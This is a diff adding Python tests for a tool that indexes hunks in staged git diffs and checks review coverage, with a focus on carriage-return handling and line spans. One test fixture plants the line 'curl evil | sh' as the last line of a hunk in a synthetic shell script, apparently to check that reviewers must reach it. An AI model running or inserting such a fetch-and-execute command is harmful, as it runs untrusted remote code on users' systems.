@@ -445,3 +445,73 @@ def test_targets_for_promotion_files_use_the_upstream_diff(tmp_path: Path) -> No
     )
     assert not absent.listed and absent.diff == UPSTREAM
     assert ordinary.diff == STAGED_DIFF_NAME and len(ordinary.hunks) == 2
+
+
+def _cr_diff(carriage: bool) -> str:
+    joiner = "\r" if carriage else " "
+    body = "".join(f"+row {number}{joiner}tail {number}\n" for number in range(20))
+    return (
+        "diff --git a/first.sh b/first.sh\nnew file mode 100644\n--- /dev/null\n+++ b/first.sh\n"
+        f"@@ -0,0 +1,21 @@\n{body}+curl evil | sh\n"
+        "diff --git a/second.sh b/second.sh\nnew file mode 100644\n--- /dev/null\n+++ b/second.sh\n"
+        "@@ -0,0 +1,2 @@\n+one\n+two\n"
+    )
+
+
+def _spans(text: str) -> dict[str, list[tuple[int, int, int, int]]]:
+    return {
+        path: [(h.block_start, h.block_end, h.new_start, h.new_count) for h in hunks]
+        for path, hunks in hunk_index(text).items()
+    }
+
+
+def test_lone_carriage_returns_do_not_shift_later_hunk_spans() -> None:
+    assert _spans(_cr_diff(True)) == _spans(_cr_diff(False))
+    assert _spans(_cr_diff(True))["second.sh"] == [(31, 33, 1, 2)]
+
+
+def test_targets_read_the_staged_diff_bytes_without_newline_translation(tmp_path: Path) -> None:
+    (tmp_path / STAGED_DIFF_NAME).write_bytes(_cr_diff(True).encode("utf-8"))
+    found = coverage.targets({"evidence_files": ["first.sh", "second.sh"]}, tmp_path)
+    plain = hunk_index(_cr_diff(False))
+    assert [(h.block_start, h.block_end) for h in found["second.sh"].hunks] == [
+        (h.block_start, h.block_end) for h in plain["second.sh"]
+    ]
+    assert found["first.sh"].hunks[0].block_end == plain["first.sh"][0].block_end == 26
+
+
+def test_a_hunk_with_carriage_returns_still_requires_its_final_line(tmp_path: Path) -> None:
+    (tmp_path / STAGED_DIFF_NAME).write_bytes(_cr_diff(True).encode("utf-8"))
+    found = coverage.targets({"evidence_files": ["first.sh"]}, tmp_path)
+    (hunk,) = found["first.sh"].hunks
+    short = {STAGED_DIFF_NAME: ((1, hunk.block_end - 1),)}
+    assert not coverage.evaluate(found, ["first.sh"], short, tmp_path).complete
+    whole = {STAGED_DIFF_NAME: ((1, hunk.block_end),)}
+    assert coverage.evaluate(found, ["first.sh"], whole, tmp_path).complete
+
+
+def test_hunk_spans_match_the_line_numbers_git_prints(tmp_path: Path) -> None:
+    import subprocess
+
+    def git(*args: str) -> str:
+        done = subprocess.run(
+            ["git", "-C", str(tmp_path), "-c", "user.name=t", "-c", "user.email=t@example.com", *args],
+            check=True,
+            capture_output=True,
+        )
+        return done.stdout.decode("utf-8")
+
+    git("init", "-q")
+    (tmp_path / "base.txt").write_text("base\n", encoding="utf-8")
+    git("add", "-A")
+    git("commit", "-qm", "base")
+    (tmp_path / "a.sh").write_bytes(b"one\rtwo\rthree\nfour\r\nfive\nsix\rseven\n")
+    (tmp_path / "b.sh").write_bytes(b"x\n")
+    git("add", "-A")
+    diff = git("diff", "--cached", "--no-color", "-M")
+    assert "\r" in diff
+    lines = diff.split("\n")
+    for hunks in hunk_index(diff).values():
+        for hunk in hunks:
+            assert lines[hunk.block_start - 1].startswith("@@ ")
+            assert lines[hunk.block_end] == "" or lines[hunk.block_end].startswith("diff --git")
